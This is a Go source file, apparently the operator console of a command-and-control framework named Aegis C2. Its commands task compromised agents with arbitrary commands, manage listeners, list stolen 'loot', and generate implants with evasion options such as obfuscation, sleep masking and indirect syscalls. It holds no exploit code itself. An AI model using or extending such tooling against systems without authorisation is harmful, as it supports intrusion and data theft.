package repl

import (
	"context"
	"fmt"
	"strconv"
	"strings"

	"github.com/aegis-c2/aegis/proto/aegispb"
)

// Command 定义一个 REPL 命令。
type Command struct {
	Name        string
	Description string
	Handler     func(client aegispb.OperatorServiceClient, args []string) error
}

// allCommands 返回所有可用命令。
func allCommands() []Command {
	return []Command{
		{Name: "agents", Description: "List all agents", Handler: cmdAgents},
		{Name: "agent", Description: "Agent details: agent <id>", Handler: cmdAgent},
		{Name: "task", Description: "Submit task: task <agent-id> <cmd> [args...]", Handler: cmdTask},
		{Name: "kill", Description: "Kill agent: kill <id>", Handler: cmdKill},
		{Name: "tasks", Description: "List tasks: tasks [--agent=id]", Handler: cmdTasks},
		{Name: "listeners", Description: "List listeners", Handler: cmdListeners},
		{Name: "operators", Description: "List operators", Handler: cmdOperators},
		{Name: "register-operator", Description: "Register operator: register-operator <name> <role>", Handler: cmdRegisterOperator},
		{Name: "profiles", Description: "List profiles", Handler: cmdProfiles},
		{Name: "profile", Description: "Profile commands: profile set <name>", Handler: cmdProfile},
		{Name: "server", Description: "Server commands: server info", Handler: cmdServer},
		{Name: "generate", Description: "Generate payload", Handler: cmdGenerate},
		{Name: "loot", Description: "List loot: loot [--agent=id]", Handler: cmdLoot},
		{Name: "events", Description: "Event history: events [--limit=50]", Handler: cmdEvents},
		{Name: "help", Description: "Show help", Handler: cmdHelp},
	}
}

// dispatch 解析并执行命令。
func dispatch(client aegispb.OperatorServiceClient, input string) error {
	trimmed := strings.TrimSpace(input)
	if trimmed == "" {
		return nil
	}

	parts := strings.Fields(trimmed)
	cmd := strings.ToLower(parts[0])
	args := parts[1:]

	for _, c := range allCommands() {
		if c.Name == cmd {
			return c.Handler(client, args)
		}
	}
	return fmt.Errorf("unknown command: %s (type 'help' for commands)", cmd)
}

func cmdAgents(client aegispb.OperatorServiceClient, args []string) error {
	resp, err := client.ListAgents(ctx(), &aegispb.ListAgentsRequest{})
	if err != nil {
		return fmt.Errorf("list agents: %w", err)
	}
	PrintAgents(resp.Agents)
	return nil
}

func cmdAgent(client aegispb.OperatorServiceClient, args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("usage: agent <id>")
	}
	resp, err := client.GetAgent(ctx(), &aegispb.GetAgentRequest{ID: args[0]})
	if err != nil {
		return fmt.Errorf("get agent: %w", err)
	}
	PrintAgent(resp.Agent)
	return nil
}

func cmdTask(client aegispb.OperatorServiceClient, args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: task <agent-id> <command> [args...]")
	}
	agentID := args[0]
	command := args[1]
	taskArgs := ""
	if len(args) > 2 {
		taskArgs = strings.Join(args[2:], " ")
	}

	priority := int32(0)
	timeout := int32(30)

	resp, err := client.CreateTask(ctx(), &aegispb.CreateTaskRequest{
		AgentID:  agentID,
		Command:  command,
		Args:     taskArgs,
		Priority: priority,
		Timeout:  timeout,
	})
	if err != nil {
		return fmt.Errorf("create task: %w", err)
	}
	fmt.Printf("  task submitted: %s\n", resp.Task.ID)
	return nil
}

func cmdKill(client aegispb.OperatorServiceClient, args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("usage: kill <id>")
	}
	resp, err := client.KillAgent(ctx(), &aegispb.KillAgentRequest{ID: args[0]})
	if err != nil {
		return fmt.Errorf("kill agent: %w", err)
	}
	if resp.Success {
		fmt.Println("  kill command sent")
	} else {
		fmt.Println("  failed to send kill command")
	}
	return nil
}

func cmdTasks(client aegispb.OperatorServiceClient, args []string) error {
	req := &aegispb.ListTasksRequest{}
	for _, arg := range args {
		if strings.HasPrefix(arg, "--agent=") {
			req.AgentID = strings.TrimPrefix(arg, "--agent=")
		}
	}
	resp, err := client.ListTasks(ctx(), req)
	if err != nil {
		return fmt.Errorf("list tasks: %w", err)
	}
	PrintTasks(resp.Tasks)
	return nil
}

func cmdListeners(client aegispb.OperatorServiceClient, args []string) error {
	if len(args) == 0 {
		resp, err := client.ListListeners(ctx(), &aegispb.ListListenersRequest{})
		if err != nil {
			return fmt.Errorf("list listeners: %w", err)
		}
		PrintListeners(resp.Listeners)
		return nil
	}

	// listener start <name> <proto> <port>
	// listener stop <id>
	subCmd := args[0]
	switch subCmd {
	case "start":
		if len(args) < 4 {
			return fmt.Errorf("usage: listener start <name> <proto> <port>")
		}
		port, _ := strconv.ParseInt(args[3], 10, 32)
		resp, err := client.StartListener(ctx(), &aegispb.StartListenerRequest{
			Name:     args[1],
			Protocol: args[2],
			Port:     int32(port),
		})
		if err != nil {
			return fmt.Errorf("start listener: %w", err)
		}
		fmt.Printf("  listener started: %s (%s://%s:%d)\n", resp.Listener.ID, resp.Listener.Protocol, resp.Listener.Host, resp.Listener.Port)
		return nil

	case "stop":
		if len(args) < 2 {
			return fmt.Errorf("usage: listener stop <id>")
		}
		_, err := client.StopListener(ctx(), &aegispb.StopListenerRequest{ID: args[1]})
		if err != nil {
			return fmt.Errorf("stop listener: %w", err)
		}
		fmt.Println("  listener stopped")
		return nil

	default:
		return fmt.Errorf("unknown listener subcommand: %s (start/stop)", subCmd)
	}
}

func cmdOperators(client aegispb.OperatorServiceClient, args []string) error {
	resp, err := client.ListOperators(ctx(), &aegispb.ListOperatorsRequest{})
	if err != nil {
		return fmt.Errorf("list operators: %w", err)
	}
	PrintOperators(resp.Operators)
	return nil
}

func cmdRegisterOperator(client aegispb.OperatorServiceClient, args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: register-operator <name> <role>")
	}
	resp, err := client.RegisterOperator(ctx(), &aegispb.RegisterOperatorRequest{
		Name: args[0],
		Role: args[1],
	})
	if err != nil {
		return fmt.Errorf("register operator: %w", err)
	}

	fmt.Printf("  operator registered: %s (role: %s)\n", resp.Operator.Name, resp.Operator.Role)

	// Save mTLS credentials if provided
	if len(resp.CertPEM) > 0 && len(resp.KeyPEM) > 0 {
		fmt.Println("  mTLS certificate issued — save the following to files:")
		fmt.Println("  --- client.crt ---")
		fmt.Println(string(resp.CertPEM))
		fmt.Println("  --- client.key ---")
		fmt.Println(string(resp.KeyPEM))
		fmt.Println("  --- ca.crt ---")
		fmt.Println(string(resp.CACertPEM))
	}
	return nil
}

func cmdProfiles(client aegispb.OperatorServiceClient, args []string) error {
	resp, err := client.ListProfiles(ctx(), &aegispb.ListProfilesRequest{})
	if err != nil {
		return fmt.Errorf("list profiles: %w", err)
	}
	PrintProfiles(resp.Profiles)
	return nil
}

func cmdProfile(client aegispb.OperatorServiceClient, args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("usage: profile <set <name>|list>")
	}
	switch args[0] {
	case "set":
		if len(args) < 2 {
			return fmt.Errorf("usage: profile set <name>")
		}
		_, err := client.SetActiveProfile(ctx(), &aegispb.SetActiveProfileRequest{Name: args[1]})
		if err != nil {
			return fmt.Errorf("set profile: %w", err)
		}
		fmt.Printf("  active profile set to: %s\n", args[1])
		return nil
	case "list":
		return cmdProfiles(client, nil)
	default:
		return fmt.Errorf("unknown profile subcommand: %s (set/list)", args[0])
	}
}

func cmdServer(client aegispb.OperatorServiceClient, args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("usage: server info")
	}
	switch args[0] {
	case "info":
		resp, err := client.GetServerInfo(ctx(), &aegispb.GetServerInfoRequest{})
		if err != nil {
			return fmt.Errorf("server info: %w", err)
		}
		PrintServerInfo(resp.Info)
		return nil
	default:
		return fmt.Errorf("unknown server subcommand: %s (info)", args[0])
	}
}

func cmdGenerate(client aegispb.OperatorServiceClient, args []string) error {
	cfg := &aegispb.BuildConfig{
		OS:     "windows",
		Arch:   "amd64",
		Format: "exe",
		Sleep:  5,
		Jitter: 20,
	}

	for _, arg := range args {
		switch {
		case strings.HasPrefix(arg, "--os="):
			cfg.OS = strings.TrimPrefix(arg, "--os=")
		case strings.HasPrefix(arg, "--arch="):
			cfg.Arch = strings.TrimPrefix(arg, "--arch=")
		case strings.HasPrefix(arg, "--format="):
			cfg.Format = strings.TrimPrefix(arg, "--format=")
		case strings.HasPrefix(arg, "--profile="):
			cfg.Profile = strings.TrimPrefix(arg, "--profile=")
		case strings.HasPrefix(arg, "--sleep="):
			v, _ := strconv.ParseInt(strings.TrimPrefix(arg, "--sleep="), 10, 32)
			cfg.Sleep = int32(v)
		case strings.HasPrefix(arg, "--jitter="):
			v, _ := strconv.ParseInt(strings.TrimPrefix(arg, "--jitter="), 10, 32)
			cfg.Jitter = int32(v)
		case strings.HasPrefix(arg, "--lhost="):
			cfg.LHost = strings.TrimPrefix(arg, "--lhost=")
		case strings.HasPrefix(arg, "--lport="):
			v, _ := strconv.ParseInt(strings.TrimPrefix(arg, "--lport="), 10, 32)
			cfg.LPort = int32(v)
		case arg == "--garble":
			cfg.Garble = true
		case arg == "--sleep-mask":
			cfg.SleepMask = true
		case arg == "--indirect-syscalls":
			cfg.IndirectSyscalls = true
		case strings.HasPrefix(arg, "--stage="):
			cfg.Stage = strings.TrimPrefix(arg, "--stage=")
		}
	}

	// Auto-default: if lhost set but lport not, default to 8443
	if cfg.LHost != "" && cfg.LPort == 0 {
		cfg.LPort = 8443
	}

	resp, err := client.GeneratePayload(ctx(), &aegispb.GeneratePayloadRequest{Config: cfg})
	if err != nil {
		return fmt.Errorf("generate payload: %w", err)
	}

	fmt.Printf("  payload built: %s (%d bytes, sha256=%s)\n", resp.Result.Path, resp.Result.Size, resp.Result.SHA256)
	return nil
}

func cmdLoot(client aegispb.OperatorServiceClient, args []string) error {
	req := &aegispb.ListLootRequest{}
	for _, arg := range args {
		if strings.HasPrefix(arg, "--agent=") {
			req.AgentID = strings.TrimPrefix(arg, "--agent=")
		}
	}
	resp, err := client.ListLoot(ctx(), req)
	if err != nil {
		return fmt.Errorf("list loot: %w", err)
	}
	if len(resp.Loot) == 0 {
		fmt.Println("  no loot")
		return nil
	}
	printTable(
		[]string{"ID", "AGENT", "TYPE", "FILENAME", "SIZE", "CREATED"},
		lootRows(resp.Loot),
	)
	return nil
}

func lootRows(loot []*aegispb.LootInfo) [][]string {
	rows := make([][]string, len(loot))
	for i, l := range loot {
		rows[i] = []string{
			trunc(l.ID, 8),
			trunc(l.AgentID, 8),
			l.LootType,
			l.Filename,
			fmt.Sprintf("%d", l.Size),
			ts(l.CreatedAt),
		}
	}
	return rows
}

func cmdEvents(client aegispb.OperatorServiceClient, args []string) error {
	limit := 50
	for _, arg := range args {
		if strings.HasPrefix(arg, "--limit=") {
			v, _ := strconv.Atoi(strings.TrimPrefix(arg, "--limit="))
			if v > 0 {
				limit = v
			}
		}
	}

	stream, err := client.SubscribeEvents(ctx(), &aegispb.SubscribeEventsRequest{})
	if err != nil {
		return fmt.Errorf("subscribe events: %w", err)
	}

	count := 0
	for count < limit {
		e, err := stream.Recv()
		if err != nil {
			break
		}
		PrintEvent(e)
		count++
	}

	fmt.Printf("  showed %d event(s) (live stream continues in background)\n", count)
	return nil
}

func cmdHelp(client aegispb.OperatorServiceClient, args []string) error {
	fmt.Println("  Aegis C2 REPL Commands:")
	fmt.Println()
	printTable(
		[]string{"COMMAND", "DESCRIPTION"},
		helpRows(),
	)
	return nil
}

func helpRows() [][]string {
	cmds := allCommands()
	rows := make([][]string, len(cmds))
	for i, c := range cmds {
		rows[i] = []string{c.Name, c.Description}
	}
	return rows
}

func ctx() context.Context {
	return context.Background()
}
